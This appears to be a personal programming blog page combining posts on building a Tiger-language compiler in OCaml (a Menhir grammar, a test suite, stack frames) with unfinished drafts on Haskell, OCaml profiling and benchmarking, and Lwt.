Parser generator is the most common type of compiler-compiler’s. It takes some formal grammar (typically it is a context-free grammar in BNF or EBNF form), that defines a syntax of a programming language. Tiger grammar with Menhir Link to heading While reading the current paragraph I highly recommend consulting the Tiger Language Reference Manual that has a precise description (along with a BNF notation) of everything we’re going to define below.
Menhir is an LR(1) parser generator library for OCaml. It integrates with Dune quiet nicely. All we need to do is to add the menhir stanza to our dune file (the one from the previous chapter). So the whole file will look like this:
(menhir (modules parser) (flags (&#34;--dump&#34; &#34;--explain&#34;))) (ocamllex (modules lexer)) (library (name ch3) (inline_tests) (libraries core stdio) (preprocess (pps ppx_inline_test ppx_expect))) (env (dev (flags (:standard -warn-error -A)))) Notice the --dump and --explain switches:
The --dump switch means to write a description of the automaton to the .automaton file. The --explain switch helps us to understand severe conflicts in terms of a grammar (rather than in terms of automaton), enabling it means to write a textual explanation of detected shift-reduce conflicts to the .conflicts file. Here is the example of how it looks. See the conflicts part of the Menhir manual for details.
We’ll use the new syntax for rules (despite the fact that it is considered experimental). First, let’s define some token aliases, priorities and associativity levels. Basically these are the same tokens we used in our lexer.
Base keywords:
%token TYPE &#34;type&#34; %token VAR &#34;var&#34; %token FUNCTION &#34;function&#34; %token BREAK &#34;break&#34; %token OF &#34;of&#34; %token END &#34;end&#34; %token IN &#34;in&#34; %token NIL &#34;nil&#34; (* nil denotes a value belonging to every record type *) %token LET &#34;let&#34; %token ARRAY &#34;array&#34; Loop-related keywords:
%token DO &#34;do&#34; %token TO &#34;to&#34; %token FOR &#34;for&#34; %token WHILE &#34;while&#34; Keywords for conditional expression:
%token IF &#34;if&#34; %token THEN &#34;then&#34; %token ELSE &#34;else&#34; Operator tokens:
(* General *) %token ASSIGN &#34;:=&#34; (* Logical *) %token OR &#34;|&#34; %token AND &#34;&amp;&#34; (* Comparison *) %token GE &#34;&gt;=&#34; %token GT &#34;&gt;&#34; %token LE &#34;&lt;=&#34; %token LT &#34;&lt;&#34; %token NEQ &#34;&lt;&gt;&#34; %token EQ &#34;=&#34; (* Arithmetics *) %token DIVIDE &#34;/&#34; %token TIMES &#34;*&#34; %token PLUS &#34;&#43;&#34; %token MINUS &#34;-&#34; Tokens for separators:
%token DOT &#34;.&#34; %token LBRACE &#34;{&#34; %token RBRACE &#34;}&#34; %token LBRACK &#34;[&#34; %token RBRACK &#34;]&#34; %token LPAREN &#34;(&#34; %token RPAREN &#34;)&#34; %token SEMICOLON &#34;;&#34; %token COLON &#34;:&#34; %token COMMA &#34;,&#34; Strings, numbers, identifiers and the EOF token:
%token &lt;string&gt; STRING &#34;string&#34; %token &lt;int&gt; INT &#34;int&#34; %token &lt;string&gt; ID &#34;id&#34; %token EOF Associativity of operators:
%nonassoc &#34;of&#34; %nonassoc &#34;then&#34; %nonassoc &#34;else&#34; %nonassoc &#34;do&#34; %nonassoc &#34;:=&#34; %left &#34;|&#34; %left &#34;&amp;&#34; %nonassoc &#34;&gt;=&#34; &#34;&gt;&#34; &#34;&lt;=&#34; &#34;&lt;&#34; &#34;&lt;&gt;&#34; &#34;=&#34; %left &#34;&#43;&#34; &#34;-&#34; %left &#34;*&#34; &#34;/&#34; The grammar rules:
%start &lt;unit&gt; main %% let main := ~ = expr; EOF; &lt;&gt; Top-level expression:
let expr := | primitive | &#34;nil&#34; | &#34;break&#34; | create_rec | create_arr | lvalue | assignment | local | conditional | loop | fun_call | unary | binary | seq It might not be obvious from the expr definition, but it also includes a thing called no value (an expression that yields no value). So when looking at the top-level expression and comparing it to the language reference manual, please note that in our grammar no_val := &#34;(&#34; &#34;)&#34; (empty seq).
There are two built-in (predefined) primitive types: int and string. The grammar rule for those is pretty straightforward:
let primitive := | &#34;string&#34;; { () } | &#34;int&#34;; { () } In our language we have only one unary operator – minus:
let unary := &#34;-&#34;; expr But we have two kinds of binary operators: boolean and “logical &#43; arithmetic”, which we’ll simply call bin:
let binary := | bin | boolean Scroll down to see the definitions of bin and boolean.
We have 2 kinds of loops: the while loop and the for loop:
let loop := | while_loop | for_loop let while_loop := &#34;while&#34;; expr; &#34;do&#34;; expr let for_loop := &#34;for&#34;; &#34;id&#34;; &#34;:=&#34;; expr; &#34;to&#34;; expr; &#34;do&#34;; expr Nothing new or unusual. And the conditional expression rule is also quite trivial:
let conditional := | &#34;if&#34;; expr; &#34;then&#34;; expr; &#34;else&#34;; expr | &#34;if&#34;; expr; &#34;then&#34;; expr Syntax for local bindings is going to be exactly like in OCaml or SML:
let local := &#34;let&#34;; decs; &#34;in&#34;; expr_seq; &#34;end&#34; Now, a slightly more complex part – declarations.
As stated in the Tiger language reference manual, a declaration-sequence is a sequence of type, value, and function declarations. No punctuation separates or terminates individual declarations.
In terms of Menhir we can express it like this:
let decs := list(dec); { () } let dec := | ty_dec (* type *) | var_dec (* value *) | fun_dec (* function declaration *) Ok, we need to define a separate rule for each declaration mentioned above.
To declare a data type in the Tiger language we start with the keyword type, after which comes the identifier, the equality token and the type declaration body:
let ty_dec := &#34;type&#34;; &#34;id&#34;; &#34;=&#34;; ty The type declaration could be a record, an array or a type alias (any identifier):
let ty := | braced(ty_fields) (* records *) | &#34;array&#34;; &#34;of&#34;; &#34;id&#34;; { () } (* arrays *) | &#34;id&#34;; { () } let ty_fields := separated_list(&#34;,&#34;, ty_field); { () } let ty_field := &#34;id&#34;; ty_ann As per language reference manual, there are two possible ways to declare a variable: with or without type annotation. The following rule reflects this:
let var_dec := | &#34;var&#34;; &#34;id&#34;; &#34;:=&#34;; expr | &#34;var&#34;; &#34;id&#34;; ty_ann; &#34;:=&#34;; expr The record and array creation rules below are also considered top-level expressions:
let create_rec := &#34;id&#34;; braced(init_rec_fields) let create_arr := &#34;id&#34;; bracketed(expr); &#34;of&#34;; expr let init_rec_fields := separated_list(&#34;,&#34;, init_rec_field); { () } let init_rec_field := &#34;id&#34;; &#34;=&#34;; expr Next, we need a function declaration rule:
let fun_dec := (* procedures doesn&#39;t return values *) | fun_head; &#34;=&#34;; fun_body (* functions return values and the type is specified after the colon *) | fun_head; &#34;:&#34;; &#34;id&#34;; &#34;=&#34;; fun_body let fun_head := &#34;function&#34;; &#34;id&#34;; fun_params let fun_body := expr let fun_params := parenthesized(ty_fields) According to our language spec:
&gt; An l-value is a location, whose value may be read or assigned. &gt; Variables, procedure parameters, fields or records, and elements are all l-values.
let lvalue := (* variable *) | &#34;id&#34;; { () } (* everything else *) | lvalue_t let lvalue_t := (* simple record field *) | &#34;id&#34;; &#34;.&#34;; &#34;id&#34;; { () } (* compound record field *) | lvalue_t; &#34;.&#34;; &#34;id&#34;; { () } (* simple array subscript *) | &#34;id&#34;; bracketed(expr) (* compund array subscript *) | lvalue_t; bracketed(expr) Assignment of an expression to lvalue:
let assignment := lvalue; &#34;:=&#34;; expr Sequence of expressions delimited by semicolon:
let expr_seq := separated_list(&#34;;&#34;, expr); { () } let seq := parenthesized(expr_seq) Function call rule:
let fun_call := &#34;id&#34;; parenthesized(fun_args) let fun_args := separated_list(&#34;,&#34;, expr); { () } Arithmetic, comparison and equality expressions:
let bin := expr; bin_op; expr let bin_op == &#34;&#43;&#34; | &#34;-&#34; | &#34;*&#34; | &#34;/&#34; | &#34;&gt;=&#34; | &#34;&gt;&#34; | &#34;&lt;=&#34; | &#34;&lt;&#34; | &#34;&lt;&gt;&#34; | &#34;=&#34; Boolean expressions:
let boolean := expr; boolean_op; expr let boolean_op == &#34;&amp;&#34; | &#34;|&#34; Helper rule for a type annotation which we used in the var_dec and ty_field above:
let ty_ann := &#34;:&#34;; &#34;id&#34; Menhir allows us to declare functions, so these are three helper functions that we used everywhere else for delimited expressions:
let parenthesized(x) == delimited(&#34;(&#34;, x, &#34;)&#34;) let bracketed(x) == delimited(&#34;[&#34;, x, &#34;]&#34;) let braced(x) == delimited(&#34;{&#34;, x, &#34;}&#34;) Test suite Link to heading In order to iterate on our parser quickly we want to automate the process of testing it against the provided example programs. The most convenient way to do that would be to create a test suite that we could run after every change we make.
Some of the provided example Tiger programs are intentionally broken, so we want to skip those:
let skipped = [&#34;test16.tig&#34;; &#34;test17.tig&#34;; &#34;test19.tig&#34;; &#34;test20.tig&#34;; &#34;test25.tig&#34;; &#34;test45.tig&#34;; &#34;test49.tig&#34;] A couple of helper functions to list the example programs (recursively):
let is_tig_ext filename = let (_, ext) = Filename.split_extension filename in match ext with | Some &#34;tig&#34; -&gt; true | _ -&gt; false let is_tig_file f = Sys.is_file_exn ~follow_symlinks:true f &amp;&amp; is_tig_ext f let rec ls_rec dir = if is_tig_file dir then if not(List.mem skipped (Filename.basename dir) ~equal:(=)) then [dir] else [] else dir |&gt; Sys.ls_dir |&gt; List.concat_map ~f:(fun sub -&gt; ls_rec (Filename.concat dir sub)) Let’s add another helper function to get current position along with a filename as a string. We’ll need it later to output an error location:
let position lexbuf = let pos = lexbuf.lex_curr_p in let col = pos.pos_cnum - pos.pos_bol &#43; 1 in Printf.sprintf &#34;%s:%d:%d&#34; pos.pos_fname pos.pos_lnum col And another two functions to run the parser and print the error details in case of failure:
let parse_with_error lexbuf = try Parser.main Lexer.read lexbuf; assert_bool &#34;Ok&#34; true with | SyntaxError msg -&gt; assert_failure (position lexbuf ^ &#34; : &#34; ^ msg) | Parser.Error -&gt; assert_failure (&#34;Syntax error: &#34; ^ position lexbuf) let parse filename ch = let lexbuf = Lexing.from_channel ch in lexbuf.lex_curr_p &lt;- { lexbuf.lex_curr_p with pos_fname = Filename.basename filename }; parse_with_error lexbuf Here is the function that we’re going to call for each .tig file:
let run_parser filename _ = In_channel.with_file filename ~f:(parse filename) Finally, the test suite is going to look like this:
let suite = &#34;tiger programs&#34; &gt;::: let tests_dir = &#34;../../../book&#34; ^ Filename.dir_sep ^ &#34;testcases&#34; in let tests_path = Filename.(concat parent_dir_name tests_dir) in let tig_files = ls_rec tests_path in (List.map ~f: (fun filename -&gt; Filename.basename filename &gt;:: run_parser filename) tig_files) let () = run_test_tt_main suite The dune file for our test suite project will simply run the testsuite.exe executable:
(executable (name testsuite) (libraries base core ch3 oUnit)) (alias (name runtest) (action (run ./testsuite.exe))) Now it’ll be much easier to work on the parser implementation. Also this test suite might be useful to detect possible regressions if we want to change the parser in the future.
Conclusion Link to heading Of course, I didn’t come up with this grammar right away. I spent almost a week implementing this parser. I started with a simple parser for “straightline programs” and iterated on it until it evolved to the fully functional Tiger-language grammar. And it took some time for me to figure out how to resolve all the shift-reduce conflicts.
Another cool feature of Menhir is its REPL, which might be helpful for debugging. This is especially useful when you already caught a parser error by running the test suite and now you want to try constructing an invalid expression to check your hypothesis. I used this kind of workflow a lot while working on this grammar.
You can run the interpreter like this:
menhir --interpret --interpret-show-cst parser.mly Now you can start typing expressions until you find something that breaks your parser. Note that you can’t use token aliases inside this REPL.
For example, here is how you can test a function declaration:
LET FUNCTION ID LPAREN ID COLON ID RPAREN COLON ID EQ IF ID EQ INT THEN INT ELSE INT TIMES ID LPAREN ID MINUS INT RPAREN IN ID LPAREN INT RPAREN END That’s it for now. The full source code for this chapter is here. Next time we’re going to work on the AST for our Tiger language.
DRAFT Making of Tiger #4, Abstract Syntax ast Link to heading Intro Link to heading TODO Making of Tiger #5, Semantic Analysis type-checking Link to heading Intro Link to heading I really enjoyed working through this chapter, but at the same time implementing the type-checking phase was a bit more difficult than working on AST, parser or lexer from the previous chapters.
DONE Making of Tiger #6, Stack frames stackmemory Link to heading Intro Link to heading In this post we’re going to add support for stack frames. Here I’ve made some notes while reading the chapter 6 to make sure I understand things clearly.
Stack
A stack is a region of memory that grows downward and shrinks upward (like icicles). The top of the stack is it’s lowest memory address. We treat stack as a big array, with a special register – the stack pointer (SP).
The stack grows only at the entry to a function, by the increment large enough to hold all the local variables for that function. The stack shrinks at the exit from the function by the same amount.
Stack frame (SF)
We need a stack frame abstraction because:
Local variables are pushed/popped in large batches on function entry/exit When local variables created they are not always initialized right away After many variables have been pushed, we want to continue accessing variables deep within the stack A stack frame consists of:
Some of local variables (others are kept in CPU registers) Return address (where control should return after completion of the current function) Temporaries and saved registers Outgoing/incoming arguments Another name for a stack frame is a function activation record. Stack frame layout depends on the ISA and the programming language being compiled.
Here is a typical stack frame layout:
: : (higher addresses) : : previous frame | i1 | [FP&#43;8] (2-nd argument) | i2 | [FP&#43;4] (1-st argument) | SL | [FP] (static link) ------------------------------------------------- | l1 | [FP-4] (1-st local variable) | l2 | [FP-8] (2-nd local variable) : : | lk | [FP-k*4] (k-nd local variable) | RA | [FP-k*4-k] (return address) : : | t1 | (1-st temp) temporaries and | t2 | (2-nd temp) saved registers : : | o1 | (1-st outgoing arg) outgoing | o2 | (2-nd outgoing arg) arguments : : | SP | [FP-?] (current stack pointer) ------------------------------------------------- : : next frame : : (lower addresses) Stack pointer (SP)
Always points to the top of the stack (lowest memory address in a stack).
Frame pointer (FP)
A term we use for convenience.
On entry to some function f we allocate a new stack frame (SF) by subtracting the frame size from the SP and the old FP is saved in the stack frame (SF).
Basically, if the frame size is fixed: FP = SP &#43; size(SF).
On function enter:
SF[0...k] = V[0...k] (put local variables in SF) SF[k &#43; 1] = FP (save the current FP in SF) FP = SP (old SP becomes the current FP) On function exit:
SP = FP (copy FP back to SP) FP = SF[k &#43; 1] (fetch back the saved FP) The size of stack frame (SF) is not known until quite late in the compilation process, but we want to know the offsets of function arguments and local variables much earlier. We put args and locals right near the FP at offsets that are known early (temporaries and saved registers are known later).
Registers
We want to use CPU registers as much as possible to make compiled programs run faster. Also we have a limited set of registers available and many functions that use them. We must be able to save and restore them (to/from a stack frame).
We say that a register is caller-save if the caller must save and restore it, otherwhise it is callee-save. Which registers are preserved depends on the machine architecture.
Parameters and returns addresses
In the early days (in 70’s) on most machines function arguments and return addresses were always passed on the stack. On modern machines, for efficiency (to avoid high memory traffic), the first several arguments, result and return address are passed in registers. The rest args are passed in memory.
Why and how usage of registers helps
Suppose f(a, b, c) calls g(x, y, z).
The f receives its args in registers \( r_1, r_2 \) and \( r_3 \), but it must pass the args x, y and z in the same registers \( r_1, r_2 \) and \( r_3 \). So the f should save those registers to its stack frame before calling g and we’re back to the memory traffic problem.
So how the usage of registers saved any time?
Leaf procedures – those that don’t call other procedures. The most procedures called are leafs which need not write their incoming args to memory. And often they don’t need to allocate a stack frame at all. Interprocedural register allocation. A technique used by some optimizing compilers to analyze all the functions in an entire program at once and assign them different registers in which to receive parameters and hold local variables. Sometimes f doesn’t need its args anymore by the time it calls g, so it can just overwrite corresponding registers. Register windows available on some architectures. Each function can allocate a fresh set of registers without memory traffic. How incoming parameters are passed
The first k args \( a_1, \dots, a_k \) are passed in registers and the rest \( a_{k&#43;1} ,\dots, a_n \) are placed at the end of the callers own frame.
If the callee needed to write any of these arguments (including those passed in registers) to memory, it would write them to the very beginning of its own stack frame.
For simplicity we’ll assume that by default everything is passed and kept in registers, except for cases when:
variable is passed by reference variable is accessed by a nested function variable is too big to fit into a single register array variables register holding the variable is needed for some other purpose there are many local variables and temporary values that they won’t all fit in registers Escaping variables
Variable escapes if:
It is passed by reference It is accessed from a nested function Its address is taken (not applicable for Tiger) But when the compiler sees a formal parameter or local variable for the first time it doesn’t yet know whether it escapes and how many registers the calculation will require.
So we must assign some provisional locations (see the alloc_local function) to all formals and locals, and decide later which of them should really go in registers.
Static link (SL)
Block structure – a feature that allow the inner functions use variables declared in outer functions Static link (SL) – a pointer to the function statically enclosing the current one Static links are stored in stack frames.
Example of program with nested functions in Tiger.
type tree = { key: string, left: tree, right: tree } function prettyprint(tree: tree) : string = let var output := &#34;&#34; function write(s: string) = output := concat(output, s) function show(n: int, t: tree) = &lt;--- [2] let function indent(s: string) = ( for i := 1 to n do &lt;--- [5] write(&#34; &#34;); output := concat(output, s); write(&#34;\n&#34;) ) in if t = nil then ident(&#34;.&#34;) &lt;--- [3] else ( indent(t.key); show(n &#43; 1, t.left); &lt;--- [4] show(n &#43; 1, t.right) ) end in show(0, tree); &lt;--- [1] output end prettyprint calls show, passing prettyprint’s own frame pointer (FP) as show’s static link (SL) show stores its static link (SL) into its own stack frame show calls indent, passing its own frame pointer (FP) as indent’s SL show calls show, passing its own static link as SL indent uses the value n from show’s frame, it can find n by using the SL (which points at the stack frame of show) Each call requires a one or more fetches using static links to resolve variables declared in outer functions.
Interface Link to heading Stack frame and calling conventions
Every machine architecture might have a different standard stack frame layout.
Suppose we have a call of the following function g(x1, x2, x3) where the 1-st parameter escapes. Here is an example of how the Frame.mk g [true; false; false] works on three different architecture.
Architecture Formals Pentium [InFrame 8; InFrame 12; InFrame 16] MIPS [InFrame 0; InReg t157; InReg t158] SPARC [InFrame 8; InReg t157; InReg t158] Pentium MIPS SPARC \( SF_{SP&#43;0} \leftarrow FP \) \( SP \leftarrow SP-k \) SAVE \(\ SP \), \( -k \), \(\ SP \) \( FP \leftarrow SP \) \( SF_{SP&#43;k&#43;0} \leftarrow r_2 \) \( SF_{FP&#43;68} \leftarrow i_0 \) \( SP \leftarrow SP-k \) \( t_{157} \leftarrow r_4 \) \( t_{157} \leftarrow i_1 \) \( t_{157} \leftarrow r_5 \) \( t_{158 }\leftarrow i_2 \) \(SF\) – Stack frame memory region \(k\) – Number of formal parameters \(t\) – Temporary location \(r_i\) – MIPS registers \(i_i\) – SPARC registers Thats why we’ll use an abstract interface for stack frames.
Most of PC’s and laptops are based on the x86 and x64 ISA. Mobile devices usually based on the ARM ISA.
x86 – family of (32-bit) ISA based on the Intel 8086 and 8088 microprocessors x64 – a 64-bit version of the x86 ISA supporting larger amounts of virtual and physical memory &#43; additional general-purpose registers x86
Has 8 general-purpose registers: eax, ebx, ecx, edx, ebp, esp, esi, edi 32-bit (4-byte) words x64
Has 16 general-purpose registers: rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi, r8 - r15 64-bit (8-byte) words Lets use the x64 ISA, there are 2 flavours of it:
Microsoft x64 System V AMD64 (which I prefer) According to the System V AMD64 ABI, the first 6 integer arguments are passed in left-to-right order in rdi, rsi, rdx, rcx, r8 and r9 registers, respectively.
Arguments 5 and higher are passed in memory. They are pushed onto the stack in reversed (right-to-left) order.
Helpful links:
System V AMD64 ABI (page 12) Calling conventions (Wikipedia) Calling conventions (OS Dev) Here is our interface for a stack frame:
(** Holds information about formal parameters and local variables allocated in this frame *) type t [@@deriving show] (** Abstract location of a formal parameter (function argument) or a local variable that may be placed in a frame or in a register *) type access [@@deriving show] (** Makes a new frame for a function with the given label and formal parameters *) val mk : Temp.label -&gt; bool list -&gt; t (** Extracts a list of accesses denoting the locations where the formal parameters will be kept at runtime, as seen from inside the callee *) val formals : t -&gt; access list (** Allocates a new local variable in the given frame or in a register. The boolean argument specifies whether the new variable escapes and needs to go in the frame. Returns &#34;in-memory&#34; access with an offset from the frame pointer or &#34;in-register&#34; access in case if it can be allocated in a register *) val alloc_local : t -&gt; bool -&gt; access To make a new frame for some function f we’ll call Frame.mk label formals, where:
label: Temp.label – static memory address of the f function (that is yet to be determined) formals: bool list – true for each parameter that escapes and false for each that doesn’t The stack frame should contain information about formal parameters and local variables allocated:
type t = { (* label at which the function&#39;s machine code begins *) label: Temp.label; (* locations of all the formals *) formals: access list; (* number of locals allocated so far *) locals: int ref; (* instructions required to implement the &#34;view shift&#34; *) instrs: Instruction.t list; } [@@deriving show] We don’t want to implement the view shift right now, so the Instruction.t is defined like this:
type t = unit [@@deriving show] ABI
Lets add some constants for System V ADM64 ABI to the Frame module. We’ll need them later.
(* word size in bytes *) let word_size = 64 / 8 (* = 8 bytes *) (* special registers *) let fp = &#34;rbp&#34; (* frame pointer *) let sp = &#34;rsp&#34; (* stack pointer *) (* x64 &#34;parameter&#34;-registers *) let rdi = &#34;rdi&#34; let rsi = &#34;rsi&#34; let rdx = &#34;rdx&#34; let rcx = &#34;rcx&#34; let	r8 = &#34;r8&#34; let r9 = &#34;r9&#34; let arg_regs = [rdi; rsi; rdx; r8; r9] (* other x64 registers *) let rbx = &#34;rbx&#34; let r10 = &#34;r10&#34; let r11 = &#34;r11&#34; let r12 = &#34;r12&#34; let r13 = &#34;r13&#34; let r14 = &#34;r14&#34; let r15 = &#34;r15&#34; (* registers that are preserved by the caller *) let caller_regs = [r10; r11] (* registers that are preserved by the callee *) let callee_regs = [rbx; r12; r13; r14; r15] Access
The access data type describes location of a formal parameter or a local variable that may be placed in a frame or in a register:
type access = (* memory location at the specific offset from the frame pointer *) | InFrame of int (* register location *) | InReg of Temp.t [@@deriving show] The rest of the Frame module implementation:
(* creates a new location for a formal parameter or a local variable, given its index and [esc] flag *) let mk_access i = function | true -&gt; InFrame ((i &#43; 1) * (-word_size)) (* escapes - alloc in frame *) | false -&gt; InReg (Temp.mk ()) (* doesn&#39;t escape - use temp (register) *) (* makes a new stack frame *) let mk label formals = let formals = List.mapi mk_access formals in let locals = ref 0 in (* don&#39;t know yet what instructions we need, so just leave it empty for now *) let instrs = [] in { label; formals; locals; instrs } let formals { formals; _ } = formals (* local variables that do not escape can be allocated in a register, escaping variables must be allocated in the frame *) let alloc_local { locals; _ } = function | true -&gt; incr locals; let offset = (!locals &#43; 1) * (-word_size) in InFrame offset | false -&gt; InReg (Temp.mk ()) alloc_local allocates a new local variable in the given frame or in a register. The boolean argument specifies whether the new variable escapes and needs to go in the frame. Returns in-memory access with an offset from the frame pointer.
alloc_local t true : → InFrame -4
alloc_local t true : → InFrame -8
alloc_local t false : → InReg t1
alloc_local t false : → InReg t2
A clever compiler might optimize the frame size by noticing when two frame-resident variables could be allocated to the same slot.
Temporaries and labels
We need a couple of more abstractions to represent a “not known yet” register and machine-language locations:
Temporary – an abstract name for a value that is temporarily held in some register Label (just like label in assembly language) – an abstract name for a static machine-language location whose exact address is yet to be determined The Temp module manages these two distinct sets of names:
(** Abstract name for a local variable that is temporarily held in a register *) type t [@@deriving show] (** Abstract name for a static memory address that is yet to be determined *) type label [@@deriving show] (** Returns a new temporary from an infinite set of temporaries *) val mk : unit -&gt; t (** Returns a new [label], whose assembly-language name is the given string (if given), otherwise it is generated. *) val mk_label : string option -&gt; label The implementation of the Temp module:
module S = Symbol type t = int [@@deriving show] type label = Symbol.t [@@deriving show] let mk = let idx = ref (-1) in fun () -&gt; incr idx; !idx let mk_label name = let idx = ref (-1) in match name with | Some s -&gt; S.symbol s | None -&gt; incr idx; let name = string_of_int !idx in S.symbol name View shift
Function arguments are seen differently by the caller and the callee. In the book this is referred to as the view shift. For example, a caller my put a parameter into register \(r_6\), but the callee may want to access it from register \(r_9\). We want to handle this view shift in the Frame module.
For each formal parameter we should calculate:
How it will be seen by callee (in a register, or in a frame location) What instructions are required to implement this view shift To keep things simple, we are not going to implement this right now.
Static links
The Frame module should not know anything about static links, because we want it be independent of any specific source language being compiled. We’ll use Translate module to manage static links.
The static link (which is a pointer to the enclosing function) is passed to a function in a register and stored into the frame, just like any other escaping formal parameter. So we will treat it as one by adding another true value at the front the list of booleans representing formal parameters. It means that for some function f(x,y) (assuming neigher x nor y escapes) we’ll have the following list:
[true; false; false] Notice the extra true at the beginning.
Translate module
The Translate module handles the notion of nested scopes (via static links), providing the interface to the Semant module.
We separate Semant from Translate module to avoid a huge, unweildy module that does both: type checking and semantic translation.
Ok, I think at this point we are ready to write some initial implementation:
type expr = unit (** Represents a nesting level *) type level (** Describes a way to access a formal parameter or a local variable. Basically, it is just a [Frame.access] plus a nesting [level] *) type access = level * Frame.access (** Outermost level at which all top-level functions and variables are declared *) val outermost : level (** Creates a new &#34;nesting level&#34; for a function *) val mk : level option -&gt; Temp.label -&gt; bool list -&gt; level (** Extracts a list of accesses *) val formals : level -&gt; access list (** Creates an [access] at the given [level]. The argument [bool] specifies whether the variable escapes *) val alloc_local : level -&gt; bool -&gt; access We don’t know yet what the expr will be, thats why it is a type alias for unit. And here is the basic implementation:
type expr = unit [@@deriving show] type level = { parent: level option; frame: Frame.t } [@@deriving show] type access = level * Frame.access let outermost = let label = Temp.mk_label None in { parent = None; frame = Frame.mk label []; } let mk parent label formals = let formals = true :: formals in let frame = Frame.mk label formals in { parent; frame } (* Returns formals (excluding the static link) *) let formals lev = (* exclude the SL *) let args = List.tl (Frame.formals lev.frame) in List.map (fun access -&gt; lev, access) args let alloc_local lev esc = let access = Frame.alloc_local lev.frame esc in lev, access Notice the formals = true :: formals in the mk function, it is there to represent a static link.
Env
We must keep the Translate.level along with the Temp.label in the FunEntry. Also we need to update the VarEntry to include the Translate.access.
Here is how our updated Env module looks like:
module T = Type module Table = Symbol.Table type access (** Variable entry *) type var_entry = { access: Translate.access; (** Describes how to access the variable **) ty: T.t (** Type of the variable *) } (** Function entry *) type fun_entry = { level: Translate.level; (** Nesting level *) label: Temp.label; (** Label of the machine-code entry point *) formals: T.t list; (** Types of the formal parameters *) result: T.t (** Type of the result returned by the function **) } (** Term-level entry *) type entry = | VarEntry of var_entry | FunEntry of fun_entry (** Contains bindings for predefined functions *) val base_venv : entry Table.t (** Predefined types *) val base_tenv : T.t Table.t Escapes
To calculate which variables should be stored in registers and which should be allocated in the frame we’ll have a special module named Escape.
Here its interface in OCaml:
(** Depth (nesting level) of the function that contains the variable declaration *) type depth (** Environment that maps variables to pairs of depth and a reference to a boolean flag indicating if a particular variable escapes *) type env = (depth * bool ref) Symbol.Table.t (** Looks for escaping variables and records this info in the [escape] fields of the abstract syntax *) val traverse_prog : Syntax.expr -&gt; unit The traverse_prog function is going to traverse the entire AST looking for escaping uses of every variable. Also, we’ll have a separate environment env to track “escaping” of variables.
Whenever a variable or formal-parameter declaration \(a\) is found at static function-nesting depth \(d\) then a new binding (d, ref false) is entered into the environment env. This new environment is used in processing expressions within the scope of the variable. Then whenever this var or formal-parameter \(a\) is used at depth \(\gt d\) (which means that it escapes), then our “escape ref” is set to true in the environment.
This should take place before semantic analysis, because the Semant module needs to know about escaping variables to do it’s work.
Semant
Now lets go and update our Semant module.
I won’t paste the whole implementation, the code is here.
Haskell @haskellhaskell Link to heading TODO A week of Liquid Haskell @liquid-haskellliquid-haskellrefinement-types Link to heading In this post I’ll share my experience of playing around with Liquid Haskell for about a week.
TODO Building a toy Ethereum-like VM in Haskell compilersethereumvm Link to heading TODO Writing a simple trading bot in Haskell trading Link to heading Some time ago I was interested in trading blah blah.
TODO Notes on parallel &amp; concurrent programming in Haskell Link to heading \begin{equation} \label{eq:1} C = W\log_{2} (1&#43;\mathrm{SNR}) \end{equation}
See: http://www.jmilne.org/not/Mamscd.pdf
\(\require{AMScd}\)
\begin{CD} K(X) @&gt;{ch}» H(X;\mathbb Q);\\ @VVV @VVV \\ K(Y) @&gt;{ch}» H(Y;\mathbb Q); \end{CD}
OCaml @ocamlocaml Link to heading DRAFT Instrumenting and profiling OCaml programs benchmarkingprofilingperformance Link to heading Intro Link to heading Profiling is rather a large topic, but basically it allows us to learn where the program spent its time and which functions called which other functions during its execution. We use that information to understand which pieces of our program are slower than we expected.
Note the difference between profiling and benchmarking: we use (micro-)benchmarking to estimate the cost of executing an individual isolated pieces of code, but we use profiling to understand to properties of the whole program and possibly find the hot spots.
Usually profiling is achieved by instrumenting either the program source code or its binary executable. Instrumentation means adding some extra code to collect the required information (for example, where it was called from), which may cause significant performance changes. This is why code should only execute if some special flag is set (like --profile / -p).
Here are some known instrumentation types according to the Wikipedia:
Manual – performed by the programmer by adding extra code to measure execution costs Automatic source level – instrumentation added to the source code by an automatic tool according to an instrumentation policy Interpreter instrumentation – interpreter debug option can enable the collection of performance metrics as the interpreter encounters each target statement Intermediate language – instrumentation added to assembly or byte code Binary translation – the tool adds instrumentation to a compiled executable Compiler assisted Runtime instrumentation and injection In this post we are going to take a closer look only at the manual instrumentation and the interpreter instrumentation in a context of the OCaml language and its ecosystem.
Typically profiling includes the following steps:
Compiling (or just running) a program with profiling enabled Executing it to generate profile data Analyzing profile data to find bottlenecks We also may want to consider the output format. Generally these forms may be available for the analysis:
Flat – Shows the average call times for each function and how much time spent executing that function. Output is in the form of a table, rows are usually sorted by decreasing time spent and a number of calls, then alphabetically by name. Here is the more detailed description with an example Call-graph – Includes call-chains involved. Helps to find functions that call other functions that spend unusual amounts of time. Again, there is a good example in gprof docs Annotated source – Lists the program source code annotated with the number of times each line of the program was executed (see an example in gprof docs) Input-sensitive – Additionally shows how an application’s performance scales as a function of its input Tools Link to heading There are several profiling tools available in OCaml ecosystem.
core_profiler
Library made by Jane Street that helps you profile programs and estimate various costs. It belongs to the Core ecosystem, which is good, but looks like it’s poorly documented. Here is the post describing this library and the docs (with usage examples).
landmarks
The tool made by LexiFi. Personally I haven’t tried it, but it looks good.
References Link to heading Statistical memory profiling:
http://ocaml.org/meetings/ocaml/2016/Jourdan-statistically_profiling_memory_in_OCaml.pdf https://www.youtube.com/watch?v=wX4m8yqbuqE Summary Link to heading Unfortunately this post is not finished :P
DRAFT Benchmarking OCaml code benchmarkingperformance Link to heading The most known tool for benchmarking OCaml code is the Core_bench by Jane Street. There is a post about it in the Jane Street tech blog that should help to get started, but it may be a bit outdated.
Here is the basic usage:
open Core open Core_bench module B = Bench.Test let benchmarks = let x = Random.float 10.0 in let y = Random.float 10.0 in [ B.create ~name: &#34;Float add&#34; (fun () -&gt; ignore (x &#43;. y)) ; B.create ~name: &#34;Float mul&#34; (fun () -&gt; ignore (x *. y)) ; B.create ~name: &#34;Float div&#34; (fun () -&gt; ignore (x /. y)) ] let () = let cmd = Bench.make_command benchmarks in Command.run cmd DONE Заметка о Lwt lwt Link to heading Что такое Lwt Link to heading Lwt это одна из наиболее популярных OCaml библиотек, разрабатываемая сообществом. По сути это просто реализация кооперативной многозадачности (как альтернативы вытесняющей многозадачности) в OCaml на основе Promises.
В дальнейшем я буду использовать слова “поток” и промис как взаимозаменямые.
Виды “многозадачностей” Link to heading Этот параграф можно пропустить
Если в двух словах, то вытесняющую и кооперативную многозадачность можно объяснить следующим образом:
